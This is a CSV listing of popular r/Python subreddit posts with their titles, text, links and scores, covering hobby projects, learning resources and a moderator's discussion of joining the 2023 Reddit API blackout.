ID,Title,Post Text,Post URL,Total Comments,Score
g53lxf,"Lad wrote a Python script to download Alexa voice recordings, he didn't expect this email.",,https://i.redd.it/2s0dj8ob12u41.png,133,12340
hoolsm,This post has:,"9777 upvotes,

967 downvotes

and 452 comments!",https://www.reddit.com/r/Python/comments/hoolsm/this_post_has/,437,9235
gftejm,I redesign the Python logo to make it more modern,,https://i.redd.it/rxezjyf4ojx41.png,266,7859
7kpme8,Automate the boring stuff with python - tinder,,https://gfycat.com/PointlessSimplisticAmericanquarterhorse,328,6727
dmkx8a,"Just finished programming and building my own smart mirror in python, wrote all of the code myself and implemented my own voice control and facial recognition features",,https://i.redd.it/24ug9g82dju31.jpg,469,6611
irh8l0,"I'm excited to share my first published book, Introduction to Python Programming for Business and Social Science Applications -- specifically geared towards students not specifically in computer science",,https://i.redd.it/ebmh8z3c8rm51.png,249,6496
gn9add,Drawing Mona Lisa with 256 circles using evolution [Github repo in comments],,https://v.redd.it/nyzyx7uyfwz41,122,5725
hqc7ol,I made a simulation using Python in which a neural network learns to race,,https://v.redd.it/bgmc6q20ela51,212,5693
ghxqod,"Thanks to everyone’s advice, my mouse drawing algorithm has gotten much better and faster!",,https://v.redd.it/sktc30zom7y41,204,5537
iehths,Debugging Cheat Sheet,,https://i.redd.it/p1i8awsivji51.jpg,112,5457
dg0etx,Just trying to create a orbit system in python and this happened...,,https://v.redd.it/8i70ps8doqr31,362,5180
gbko3e,Dev'ing an app to help visualize data from any matplotlib figure,,https://gfycat.com/lineartangeese-application-visualizer-visualizar-augmented-data,157,5075
hmoabi,I've designed brand new cheatsheets (x2) and handouts (x3) for matplotlib,,https://raw.githubusercontent.com/matplotlib/cheatsheets/master/cheatsheets-1.png,109,5037
hpr28u,"I am a medical student, and I recently programmed an open-source eye-tracker for brain research",,https://v.redd.it/tqzx750wzda51,194,4959
7jti46,"MS is considering official Python integration with Excel, and is asking for input",,https://i.imgur.com/l2f9Zvb.jpg,395,4621
gzila7,Python 3 in One Pic,,https://i.redd.it/dixavkhibu351.png,170,4581
f55076,I've made a 3D scanner that's fully automated using Python script on Android phone!,,https://v.redd.it/n8nsbsq0pfh41,89,4529
ga7y7f,I made a little program that mutes spotify ads because i dont have the money to get premium . Not anything special but i think its quite neat. Any ideas on cool python projects i can build ?,,https://i.redd.it/47qqwabpvqv41.png,344,4461
hg9sk8,The only way to satisfy a programmer on his birthday!,,https://i.redd.it/cbz37hmdx9751.jpg,236,4437
e9fgjp,Happy Holidays! Made a user-directed greeting card using Python Turtle Graphics,,https://v.redd.it/uo2qj6bed3441,89,4382
cmdbuf,Python's response to MATLAB,,https://i.redd.it/lunmi0varne31.jpg,376,4283
fjqoxv,Laid off for 8 weeks. Anyone else starting their python journey?,,https://i.redd.it/uqia9wc853n41.jpg,314,4251
fr5561,[Beginner’s Guide] How to start programming in Python,,https://i.redd.it/kwubxzttulp41.jpg,117,4204
7mwgtw,Python Cheet Sheet for begineers,,https://i.redd.it/4iklecheyw601.jpg,124,4202
gs7xdb,A Python GUI for uninstalling the default Windows 10 apps.,,https://i.redd.it/r51f4jvzti151.png,199,4160
goldxf,"A tool that copies a selected area of your screen, not as a picture, but as pastable text (GitHub in comments)",,https://v.redd.it/6guhj6h62c051,189,4126
f35yg0,"Python project that answers high-school problems almost instantly. Made using Tesseract, Scrapy and Flask.",,https://v.redd.it/gvd3q20u0ng41,227,4052
hu4umj,Thought this looked familiar...,,https://i.redd.it/mfy0xday2ub51.jpg,37,3933
jui7zw,"PrettyErrors, a module to format exception reports",,https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png,168,3933
gvnyx5,Finished a program that draws images with epicycles!,,https://i.redd.it/2cu4xa8wum251.gif,147,3924
hrvxrd,Python in a nutshell (Had to do it),,https://i.redd.it/o5fhi4uw33b51.jpg,113,3865
er9q4h,I wrote a Python program to play Google Dinosaur Game using Gesture Recognition,,https://v.redd.it/h0i88azauvb41,116,3861
gjlcyp,"I made an AI opponent for lesser known board game - Chain Reaction. Apparently, it plays better than me!",,https://v.redd.it/7dvqal3f4qy41,170,3853
iwt09a,End-to-End Self Driving Car - Need For Speed,,https://v.redd.it/48358seyafo51,262,3815
g5bbss,My Professor wants hand written assignments. So I made MyhandWriting.. that can write in myway on a A4 sheet paper.,,https://v.redd.it/no19vtbyq4u41,360,3785
glzol8,So I made a Python and Arduino project that dynamically changes sets the ambient lighting to match the computed dominant color values from the wallpapers.,,https://v.redd.it/nkrgfihtciz41,178,3754
isbjm4,"I am excited to share my 8th published book, Python 101, geared for beginners and intermediate level readers",,https://i.redd.it/jsla1w1pq0n51.jpg,134,3740
j5a2ih,This great message,,https://i.redd.it/iyb4l795b6r51.png,101,3655
1434dxo,Should r/Python participate in the June 12th Blackout protesting the API changes,"

""I didn't have time to write a short letter, so I wrote a long one instead.""

This is a long one, so I'm putting the TLDR up top:

# TLDR
A blackout has been proposed for June 12-14 to protest the API changes and extreme cost. 

The r/Python community seems very vocal about joining the blackout and I would like the r/Python community's input on this. Would you like to participate? How would you like to participate? 

If we do join the blackout, there are two different ways to participate which we need:
- Setting the subreddit to private (no engagement at all--including no ability to explain why our sub is private)
- Turning off submissions (the community and posts are still viewable, but no new comments or posts)

Please offer your feedback here, this isn't my decision alone to make.

# Background to the issue:
Reddit has been making changes. 

Ahead of their IPO, they're trying to get their ducks in a row, but in trying to maximize their value to potential shareholders, they're cutting off massive avenues of value to moderators and users. 
* Reddit, without warning, cut off [Pushshift's API access](https://www.reddit.com/r/modnews/comments/134tjpe/reddit_data_api_update_changes_to_pushshift_access/) (The stated reason is no response--but given their pricing structure for 3rd party mobile apps, and the time frame Reddit gave third party apps, any response by pushshift would have almost certainly resulted in this same action)
* Reddit is making a move to [remove API access to third party apps and developers](https://www.reddit.com/r/modnews/comments/13wshdp/api_update_continued_access_to_our_api_for/). It's no stretch that this move is motivated because after a number of years they're unable to compete in the mobile app space. So instead of 'git-ing gud' they're just shutting down competition. [Apollo App Response](https://www.reddit.com/r/apolloapp/comments/13ws4w3/had_a_call_with_reddit_to_discuss_pricing_bad/), [Rif Response](https://www.reddit.com/r/redditisfun/comments/13wxepd/rif_dev_here_reddits_api_changes_will_likely_kill/)
* They said RES will experience 'minimal' impact and old Reddit will be preserved. In the words of the Toolbox devs, ""[[they are not impacted.] Yet](https://www.reddit.com/r/toolbox/comments/141locs/announcement_reddits_upcoming_api_changes_and/jn0klpy/?context=10000) (Toolbox is a great tool for moderation because moderating with Reddit's site tools alone is a pain), and similarly [RES developers are not overly trusting](https://www.reddit.com/r/RESAnnouncements/comments/141hyv3/announcement_res_reddits_upcoming_api_changes/). Similarly, the [API once was safe](https://www.reddit.com/r/ModCoord/comments/142jwv3/oh_really_spez/jn5f0of/)
* [Reddit has laid off 5% of their staff](https://www.reuters.com/technology/reddit-lay-off-about-5-workforce-wsj-2023-06-06/)

The above actions are presented with bias--because frankly I am biased and Reddit is presenting their reasoning with bias so please take both sides' explanations with a grain of salt. Or Crait's worth of salt. But I feel they are presented accurately enough for this post's purpose. 

# Why we care about these changes:
## As a Moderator
There are a number of issues that a moderator has to deal with. 

First and foremost, I volunteer to do this. Moderation can be a drain on my energy, and is a time sink. Losing efficiencies reduce my ability to moderate, and Reddit Inc is laughably behind. 

* Reporting content as a moderator for admin review is an absolute pain, often a black box, there's at least three separate ways to report something instead of one consolidated form or three ways with parity across all three. The mechanisms have some overlap too. It's bad. 
* Often the admin response is subpar. As a mod I get that, my responses are subpar as well, and often times purposefully subpar because you need to make a decision on some content and there's just only so much to go off of. But it's for the extreme cases that the subpar response becomes a problem, like when there's a clear botnet falsifying engagement, and I've highlighted 10 accounts in it, and highlighted the way to flag them, and only two of those get tagged as ""actioned for ban evasion"" and the other 8 are free to keep on posting. Identifying a botnet should be easy on the Reddit side, it's exhausting on mine. One of the ways to help flag this is groups like Pushshift, and loosing that means I either knowingly allow manipulation or I give up more volunteer time hunting manipulation down. (By the way the specific one I am being vague about was brought to my attention thanks to a user's report. If they didn't flag it I probably would have missed that botnet, small though it was, so I really appreciate those comments and reports).
* I cannot trust the admins. This isn't combative in nature, but it's because we have different goals. Often times they align, but sometimes our goals are at odds of each other. My goal is to try to make sure the communities I moderate are best able to thrive, and Reddit Inc's goals are to drive engagement and ad revenue. Usually, like when we get to do something fun like a great AMA, we get great community events and Reddit gets engagement and clicks. But long term, Reddit will always follow profit. 

So these changes impact my workflow, and avenues to review and moderate content. And these are issues impacting our community. /r/Python is a great sub and great community. Compared to a lot of other subreddit we have relatively few issues. 

Communities which are identity, political, or news in nature have to deal with so much more. There's a ton to manage, there's a ton of filtering for mental health and safety that is needed too. Reddit is getting there when it comes to a lot of features, but their implementation is slow. It's getting measurably faster as they restructure, but they're still catching up to third party apps. 



## As a reddit user/Python developer
APIs are important. They're a wonderful gateway to programming, they help webpages serve information in a more lightweight fashion when webscraping would be costly (if you just need an upvote count, it's smarter to just make a call for than, then making a call for every asset a webpage renders. This gets a user what they need and isn't a burden on the site they're engaging with). APIs as a result both act as a great learning mechanism and as a way to keep from burdening the site as a whole.

No third party apps as alternatives makes it easier for Reddit to harvest data without pushback. And it makes it harder for users to customize their experience. This can be exceptionally important when it comes to communities which cater to important segments of the population, but segments which are so small that a profit focused organization would otherwise ignore. 

One of the more notable communities that these changes strongly impact is /r/blind, and there's an [explanation of these changes and their impact here](https://www.reddit.com/r/Blind/comments/13zr8h2/reddits_recently_announced_api_changes_and_the/). It's very probable that these issues will be quickly addressed now that they're in the public eye. But the underlying reality is that third party apps had been able to cater to users and communities and the Reddit app, with Reddit's stewardship, has failed to address accessibility at this level. 



# The Blackout
On June 12th a [blackout has been purposed](https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/). 

[Many communities are praticipating](https://www.reddit.com/r/ModCoord/comments/1401qw5/incomplete_and_growing_list_of_participating/), and as this post points out we're curious if we should join. The blackout is either to cover a two day span, or last until demands are appropriately addressed. (this distinction is on a community basis, and will probably depend on how reddit responds)

There are different ways to perform it, either set the sub to private or lock the sub so no submissions can go through. Setting the sub to private prevents all engagement in the sub, but also means that presenting a message to users about what is going on isn't possible. 

I think it makes sense to keep the sub up and visible but to freeze it so no new posts or comments go through, but I'd like to hear your thoughts. 

# The Admins Response to the blackout
[Here is their reply](https://www.reddit.com/r/modnews/comments/141oqn8/api_updates_questions/)


A rough TLDR (I'm omitting the NSFW changes because... They're not clear to me. Maybe that's my shortfall but I think they're very vague about those)
1) Reddit isn't changing their position at all. They're digging in their heels and 'clarifying' what they're doing. No decision is reversed. 
2) bots using api for mod tools will be safe--if they break ""[Reddit] will work with you to fix them. "" 
3) launching at future dates: mod features 

___
On 2)--they basically told Apollo app to, ""Figure it out themselves""  https://www.reddit.com/r/redditdev/comments/13wsiks/api_update_enterprise_level_tier_for_large_scale/jmolrhn/?context=3
so forgive me if I don't find goodwill in that message. 

On 3) So many of those updates exist already in third party apps. So many of them are only getting attention this long into the Reddit app's lifespan because mods are making a stink about not moderating through the Reddit app. So especially for the rollout date of Sept. portions--I don't really believe it'll be executed well. And I don't want the mobile app on my phone. It's big, slow, and harvests a lot of data. 

And when that post went live Reddit was breaking again. 

https://www.redditstatus.com/

Not really something that exudes confidence in their ability to make good product decisions.

Now being fair here, there absolutely has been a [focus on improving modtools](https://www.reddit.com/r/reddit/comments/107orxe/ringing_in_2023_with_a_2022_reflection_on_mod/) over this past year, but they're still wildly behind. It's.. uncomfortable to trust a site when they cut off the alternatives for profit. Once there's no competition there's no longer a reason to loose revenue on further developing these resources. 

We were a part of the Reddit Talk platform development, and the admins we got to work with were lovely, and worked hard to greenlight the features moderators requested. A lot of those features were fleshing out the API so we could handle a Reddit Talk session in our workflows. 

But after a while [they shutdown Reddit Talk](https://www.reddit.com/r/RedditTalk/comments/11m4ijn/sunsetting_reddit_talk/) and that makes it difficult to trust long term product commitments from Reddit. Even if we get great admins who listen to feedback rolling out a product--they're not ultimately the ones who make the calls for the future. 

The admin response to the threat of a blackout reaffirms their changes and makes a lot of future promises for moderation tools. They sound good but at best those features should have been here ages ago, and their presentation betrays a lack of focus or care for moderation tools until recently. That recent change is affirming to see, but looking at Reddit's track record it might just be a passing phase until the public eye is off of the company. 


# What does this mean to /r/Python
That is mostly my question to you.

There are some defined things:

- If we blackout, the sub turns off. No one can post or comment for a while, and we hope our added voice helps encourage Reddit to continue to allow third party apps.
- If we don't join the blackout, we can still hope but there's less weight behind it. 

We don't normally join in on Reddit's protests. So this would be a new thing for our community--is this cause worth the loss in a few days of posts?

There is a [post by another user asking this question](https://old.reddit.com/r/Python/comments/1424s7m/going_dark_on_12th_june/) and at present it is the second most upvoted submission in the past year. So there has been a lot of great talk already, but I need to ask this question here as well to be sure I'm listening to the community as a whole. 

**Should /r/Python join the June 12th Blackout?** 

If we do, should we completely go private, or should we prevent the commenting or posting in our community during that period so an explanation of what is going on is viewable?

Please give your feedback, I'm reading through both this and the original submission to keep an eye on things. Remember though, be respectful. We're a Python focused community, so in addition to the rules here in the sub, I hope you'll adhere to the [PSF Code of Conduct](https://www.python.org/psf/conduct/). Be respectful to one another. Disagree with opinions, but be respectful of people. 

And now for [something completely different](https://www.reddit.com/user/iamkindofcreative/m/a_green_space/)",https://www.reddit.com/r/Python/comments/1434dxo/should_rpython_participate_in_the_june_12th/,338,3614
gaqe3d,Made an annoying Python script that sends a friend on Facebook Messenger the Shrek movie word by word,,https://i.redd.it/04iw5fezewv41.png,274,3544
yyi6xv,The Python Mega Course is now free on Udemy,"As some of you know, *The Python Mega Course: Build 10 Real World Applications* is one of the top courses on Udemy. I remade the course this year and now the course uses Python 3.11.

Today, I am now giving the previous version of the course to you for free. Please note that everything still works in the old version, and you are taking the same content taken by other 200k students in the past. It's just that we use Python versions before 3.10 in the videos.

Udemy link to get the course for free:

[https://udemy.com/course/former-python-mega-course-build-10-real-world-applications/](https://udemy.com/course/former-python-mega-course-build-10-real-world-applications/)

Password to enroll: *mega\_course*

Enjoy!

**Edit**: Wow, 2.5k upvotes! Thank you so much! If anyone wants the new Udemy (paid) version of the course as well, you can get a good discount here: [https://pythonhow.com/python-paid-course/the-python-mega-course/](https://pythonhow.com/python-paid-course/the-python-mega-course/)",https://www.reddit.com/r/Python/comments/yyi6xv/the_python_mega_course_is_now_free_on_udemy/,202,3476
ggt5ld,I'm developing a game with Python and Pygame!,,https://i.redd.it/jogf31rlmux41.gif,216,3456
izspe0,I made an Instagram Bot to make DeepFakes for everyone! @deepfake.maker,,https://v.redd.it/0g28dzoh5dp51,140,3408
i9q4dx,I finished my Python Ray Tracer capable of rendering refraction and thin film interference!,,https://v.redd.it/gtgkdmis3xg51,106,3390
iiamfv,This post has,"3829 upvotes,

572 downvotes,

297 comments, 

3257 score,

and 3 awards!



Edits: 23526 since Friday, August 28, 2020 at 8:30PM EST.

Credit to u/Krukerfluk and Tom Scott!

Code: https://github.com/CalvinMiller190/reddit-post

This post uses the [praw module](https://praw.readthedocs.io/en/latest/) to get the information about the post, then edits the post every second based on the information that it got!",https://www.reddit.com/r/Python/comments/iiamfv/this_post_has/,279,3359
h9bfe4,Made a Screen Dimmer based on Facial Recognition with OpenCV and AppleScript!,,https://v.redd.it/ns6wu0ho11551,132,3325
hnknw0,"A Program that acts as an ""invisibility cloak""... It camouflages any person/object that appears in front of the camera.... Sorry for the colour jittering🙈",,https://v.redd.it/btu87d6hyn951,120,3329
63dkmq,"We started late, but we managed to leave Python footprint on r/place!",,https://i.redd.it/t29ko63dwipy.png,75,3310
itzn13,An update on Python 4,,https://i.redd.it/ayxwpuasjjn51.png,391,3273
e2234a,hashtags,,https://i.redd.it/8ss44ve160141.jpg,112,3225
hv2vds,Got my first job as a developer!,"Finally!

After 9 months of purely studying and nothing else. Started from absolute 0 and landed my first job in Data Science on a marketing company.

Have to say it was very hard since I know no developers at all and had no one to ask from help.

Still feels weird and definitely have a stromg case of imposter syndrome but after writing my forst lines of code it does feel much better!

Sorry for the useless trivia but like I said,have no dev friends so I had to share the excitement somewhere :D",https://www.reddit.com/r/Python/comments/hv2vds/got_my_first_job_as_a_developer/,251,3228
j3hq21,Recursively flipping and rotating an image. Python source code in comments!,,https://v.redd.it/p3l9kd1dwjq51,60,3207
j2ai2r,I released the Code for the Instagram DeepFake Bot!,,https://v.redd.it/8yof81xg56q51,87,3205
hb108j,I made a ray tracer that simulates curved spacetime by using Einstein's field equations from general relativity. Here's a black hole!,,https://i.redd.it/yrcat3ndkj551.jpg,127,3129
j8kpes,I maDe a sCriPT thAT raNdOMlY cApiTAlIZes lEtTErs iN a SEntENcE,"I waS tIrED OF mAnUaLlY tYPinG UpPEr And lOwERcaSes, whEn i wANteD tO mOCk A coMMeNT. sO i MAde a ScRIpt FOr It iNsTeaD. iT TaKEs anY stRIng And rANdOMly apPLieS aN UPpeR or LowERcaSe to IT. iT aLso maKes sUre tHeRe Are no MoRe ThAN twO oF ThE SAme upPEr or lOwERcAseS iN A roW, BeCauSe haVinG tHreE oF thE SaME iN A Row LooKs rEAllY WEiRD. I ALso coNSidEReD MAkiNg SuRe thAT 'i' WOuLD aLWaYS bE in LOwErcASe And 'L' WoUlD alWAyS Be in uPpErCAsE, BUt THaT MAdE it lOoK kiNDa wEIrd. ANyWAys, heRE'S THe COdE:

[https://github.com/peterlravn/My-projects/blob/master/A%20ScrIpt%20tO%20MaKE%20fUN%20of%20A%20sENteNcE.ipynb](https://github.com/peterlravn/My-projects/blob/master/A%20ScrIpt%20tO%20MaKE%20fUN%20of%20A%20sENteNcE.ipynb)

i'M kiNdA neW tO pyThOn, so thErE'S prOBabLy THinGs In thE coDe thAT's noT VerY... pyTHoNIc...

EdIt: HErE'S A NeW AnD UpDaTEd VerSiOn, WHicH WOrKs bY hiGHliGhtIng tEXt anD tHEn coPIeS ThE nEw SPonGe-tEXt tO The clIp bOArd:

[https://github.com/peterlravn/My-projects/blob/master/A%20ScrIpt%20tO%20MaKE%20fUN%20of%20A%20sENteNcE%20v.2.ipynb](https://github.com/peterlravn/My-projects/blob/master/A%20ScrIpt%20tO%20MaKE%20fUN%20of%20A%20sENteNcE%20v.2.ipynb)",https://www.reddit.com/r/Python/comments/j8kpes/i_made_a_script_that_randomly_capitalizes_letters/,196,3118
h7qjw7,Replicating Face Mask Detection - OpenCV and MobileNetV2,,https://i.redd.it/r9phf28hyi451.gif,74,3089
jltffk,I think it’s clear why I chose a Software Engineering career path instead of being an Artist,,https://i.redd.it/9hswsxs1yiw51.jpg,70,3029
j02ftz,Trying to keep my Jump Rope and AI Skills on point! Made this application using OpenPose. Link to the Medium tutorial and the GitHub Repo in the thread.,,https://v.redd.it/e2pr66nkdgp51,83,2985
jii8ex,"I teach Python courses - here's my collection of about 1,000 slides on various Python topics, including data science (hosted on GitHub, licensed under CC-BY-SA)",,https://marko-knoebl.github.io/slides/#python,89,2975
fna798,"Because of quarantine and online clases I made some scripts to automatically connect to my zoom classes to get more sleep, I also configured my Mac to show old recording of me as a virtual cam in zoom so I don't have to attend early classes",,https://i.redd.it/inog500edbo41.png,120,2946
f7taiy,My python image/GIF glitching library is now on pypi!,,https://i.redd.it/os82omztkhi41.gif,71,2928
6no8fm,"Python Section at Foyle's, London",,https://i.redd.it/4o8d01o5e0az.jpg,79,2924
in1pyu,I made a Spotify ad stopper because I was too poor for Premium. It automatically detects when an ad plays and then restarts Spotify in the background. It's my first project after escaping tutorial hell and I'd love any feedback you guys have!,"It detects when an advertisement plays by monitoring the type of what track is currently playing, using the Spotipy api. It then closes and opens Spotify by the os module and plays it via pynput.

There have been a few programs in this subreddit which offer a similar functionality but mute spotify, and play another locally-stored song. I preferred not using that method and hence did this.

The code is present below, and is also present in my github repo [here](https://github.com/SakDev/SpotiByeBye).

Once again, I truly would appreciate any constructive feedback!

https://preview.redd.it/prkuja5q6cl51.png?width=4560&format=png&auto=webp&s=36f824adc24665e71d497aeb7e8afde5b1f2e9f7

**Edit**: Thank you so much for your positive response!!!! I've added a readme file to help anyone understand the gist of setting up the Spotify API to get your Client ID and secret.

~~And to all the people who claim this is stealing, I just wanted to say that while it does test ethical bounds, this program merely restarts Spotify using legally-obtained data from Spotify.~~

While this project has been an immensely rewarding learning experience, u/rtphokie kindly provided [reasons](https://www.reddit.com/r/Python/comments/in1pyu/i_made_a_spotify_ad_stopper_because_i_was_too/g45jgkd?utm_source=share&utm_medium=web2x&context=3) as to why this *could* possibly violate copyright laws. Hence I recommend one to utilize the code solely for learning purposes.",https://www.reddit.com/r/Python/comments/in1pyu/i_made_a_spotify_ad_stopper_because_i_was_too/,154,2906
gpaegj,"I was tired of opening 100s of tabs for internship apps. So, I made an app to scrape and apply to every single job listing on Glassdoor with one click using Selenium! (source code and YT video linked below)",,https://v.redd.it/mdmvodcz9k051,164,2877
fbavjd,Change text in place with custom hotkeys (Python Keyboard Listener),,https://v.redd.it/g0xfnan4euj41,118,2883
d23ibi,Found this on twitter,,https://i.redd.it/dbmkeewxipl31.jpg,187,2865
d3mvh0,I made a python drawing,,https://v.redd.it/t1ddbj432cm31,141,2861
hvq628,Randomly Generate 69420 - Generate random 5-digit numbers until 69420 is generated,,https://v.redd.it/8lxqrb6tedc51,263,2812
ghab3o,Fourier Series Visualizer in pygame.,,https://v.redd.it/lc0tk3knb0y41,60,2776
g2njfz,Hexapod Robot Simulator with only Numpy and Plotly Dash,,https://v.redd.it/uxfc7gjku8t41,86,2767
hxnyge,I made a project that generates the graph,,https://i.redd.it/x8ueald2o0d51.png,98,2764
jfx7wy,How to quickly remove duplicates from a list?,,https://i.redd.it/kppp9jkojmu51.png,198,2744
ndozrt,Why would you want to use BeautifulSoup instead of Selenium?,"I was wondering if there is a scenario where you would actually need BeautifulSoup. IMHO you can do with Selenium as much and even more than with BS, and Selenium is easier, at least for me. But if people use it there must be a reason, right?",https://www.reddit.com/r/Python/comments/ndozrt/why_would_you_want_to_use_beautifulsoup_instead/,170,2723
g7q2ej,My pothole detector. Used yolov3 annotated images on labelimg.,,https://i.redd.it/rnpdy79kbxu41.jpg,141,2690
gwdjwr,I made a fractal tree in python using turtle,,https://i.redd.it/l8fryljmvu251.png,93,2680
dmzs6s,I created a python script to generate color palettes from images (info + github link in comments),,https://i.redd.it/70kl5aweqpu31.jpg,105,2674
7kcjeq,Microsoft Considers Adding Python As an Official Scripting Language in Excel,,https://developers.slashdot.org/story/17/12/15/1133217/microsoft-considers-adding-python-as-an-official-scripting-language-in-excel,163,2674
gyt05b,Snake 4d - 4 spatial dimension game,,https://v.redd.it/ncxxt6azim351,118,2655
qxeyrn,"PrettyErrors, a module to format exception reports",,https://raw.githubusercontent.com/onelivesleft/PrettyErrors/master/example.png,80,2650
hr24b1,I'm working on a 2d N-body simulation using Python and Pygame,,https://v.redd.it/j1kc6aaoxta51,91,2646
ld81ic,I created a series in Python that takes you through every detail step-by-step (code included) on how to create your own algorithmic trading bot that trades the financial and crypto markets for free.,"# How to create an algorithmic trading bot with Python

&#x200B;

1. [Overview](https://www.conorjohanlon.com/overview/) \- An overview of the project.
2. [Design](https://www.conorjohanlon.com/lets-design-part-1/) \- Requirements and how the trader operates.
3. [Getting financial data into Python](https://www.conorjohanlon.com/getting-data-from-mt5-to-python/) \- Pulling financial data into Python from MetaTrader5.
4. [Open a trade using the MT5 API with Python](https://conorjohanlon.com/how-to-open-a-trade-in-mt5-with-python/) \- How to open a trade programmatically via MetaTrader 5.
5. [Close a trade with MT5 using Python](https://www.conorjohanlon.com/close-a-trade-with-mt5-using-python/) \- How to close an open trade with MetaTrader 5.
6. [Creating an algotrader/trading bot with Python – Part 1](https://www.conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-1/) \- Creating the trading bot loop and opening trades with an entry strategy.
7. [Creating an algotrader/trading bot with Python – Part 2](https://conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-2/) \- Implementing a strategy reader.
8. [Creating an algotrader/trading bot with Python – Part 3](https://www.conorjohanlon.com/creating-an-algotrader-trading-bot-with-python-part-3/) \- Closing a trade with an exit strategy.
9. [Creating a strategy for your algorithmic trading bot – Part 1](https://www.conorjohanlon.com/creating-a-strategy-for-your-algorithmic-trading-bot-part-1/) \- Creating a dynamic strategy with JSON for trading part 1.
10. [Creating a strategy for your algorithmic trading bot – Part 2](https://www.conorjohanlon.com/creating-a-strategy-for-your-algorithmic-trading-bot-part-2/) \- Creating a dynamic strategy with JSON for trading part 2.
11. [Dynamically calculate lot size for your algorithmic trading bot](https://www.conorjohanlon.com/dynamically-calculate-the-lot-size-your-algorithmic-trading-bot/) \- Dynamically calculate your position size based on account size and risk.
12. [Send messages from Python to Slack](https://www.conorjohanlon.com/sending-alerts-from-python-via-slack/) \- Sending open trade/close trade alerts to slack.
13. [Send an email from Python](https://www.conorjohanlon.com/send-an-email-from-python/) \- Sending open trade/close trade alerts via email.
14. [Trade management for the ](https://www.conorjohanlon.com/trade-management-for-algorithmic-trading-bot/)[algorithmic trading bot](https://www.conorjohanlon.com/trade-management-for-algorithmic-trading-bot/) \- How to manage your trades and limiting your risk.

*Disclaimer: Trading financial markets involves risk, and is not suitable for all investors. I am not responsible for any losses incurred due to your trading or anything else. I do not recommend any specific trade or action, and any trades you decide to take are your own.*  


**EDIT: I just want to say a huge thank you for the overwhelming support everyone in this community has given to me. I will be continuing this series diving into more advanced topics and eventually will share how I created a UI for the bot and also for back testing.**",https://www.reddit.com/r/Python/comments/ld81ic/i_created_a_series_in_python_that_takes_you/,217,2636
hx9q9p,A Command Line Stock Dashboard,,https://i.redd.it/uf086t7davc51.png,98,2614
abjuw4,These two books changed my life in 2018!,,https://i.redd.it/dramdluyhu721.jpg,176,2595
hkr6u5,Happy 4th of July from Chicago,,https://i.redd.it/omo1c38dlp851.jpg,69,2584
gf4boc,"I created my first app, ""Timeglass"", a simple, unobtrusive menu bar timer for macOS.",,https://i.redd.it/nge5pe54pbx41.png,96,2574
nf4jh0,Embedded Python: Build a Game on the BBC micro:bit – Real Python,,https://realpython.com/embedded-python/,11,2554
1424s7m,Going dark on 12th June,"I wanted to ask you if r/Python is planning to join the protest against Reddit's new policy. Many subreddits decided to support that initiative. I know it is not directly related to Python, but it is relevant to our community

[what's going on? ](https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/)",https://www.reddit.com/r/Python/comments/1424s7m/going_dark_on_12th_june/,176,2543
gxsb8v,I created a GUI that collates various interests of mine in one handy place,,https://i.redd.it/7g7z9qnqya351.jpg,132,2546
i4x5bw,White Cuts Across Black Background - an effect achieved through good use of the Python Image Library,,https://v.redd.it/nn4a1e4jcff51,56,2548
gizm2t,"With my limited knowledge in Python, I wrote a simple script to control my motorized microscope from a keyboard. All instructions are open-source. Just wanted to share with this community for possible comments and suggestions for further improvements.",,https://v.redd.it/b8v3w1nrfjy41,100,2537
arp3z9,Lil cheatsheet,,https://i.redd.it/e9he5yt327h21.jpg,140,2532
l1jdcj,"I made a course on NumPy. It got good reviews, but sales were weak so I'm releasing the entire thing for free.","My course is called Python NumPy For Your Grandma - So easy your grandma could learn it. Here's the course outline.

1. **Introduction**  
  [1.1 Introduction](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-1-1-introduction)  
2. **Basic Array Stuff**  
  [2.1 NumPy Array Motivation](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-1-numpy-array-motivation)  
  [2.2 NumPy Array Basics](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-2-numpy-array-basics)  
  [2.3 Creating NumPy Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-3-creating-numpy-arrays)  
  [2.4 Indexing 1-D Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-4-indexing-1d-arrays)  
  [2.5 Indexing Multidimensional Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-5-indexing-multidimensional-arrays)  
  [2.6 Basic Math On Arrays](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-6-basic-math-on-arrays)  
  [2.7 Challenge: High School Reunion](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-7-challenge-high-school-reunion)  
  [2.8 Challenge: Gold Miner](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-8-challenge-gold-miner)  
  [2.9 Challenge: Chic-fil-A](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-2-9-challenge-chic-fil-a)  
3. **Intermediate Array Stuff**  
  [3.1 Broadcasting](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-1-broadcasting)  
  [3.2 newaxis](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-2-newaxis)  
  [3.3 `reshape()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-3-reshape)  
  [3.4 Boolean Indexing](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-4-boolean-indexing)  
  [3.5 nan](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-5-nan)  
  [3.6 infinity](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-6-infinity)  
  [3.7 random](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-7-random)  
  [3.8 Challenge: Love Distance](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-8-challenge-love-distance)  
  [3.9 Challenge: Professor Prick](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-9-challenge-professor-prick)  
  [3.10 Challenge: Psycho Parent](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-3-10-challenge-psycho-parent)  
4. **Common Operations**  
  [4.1 `where()`](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma-4-1-where)  
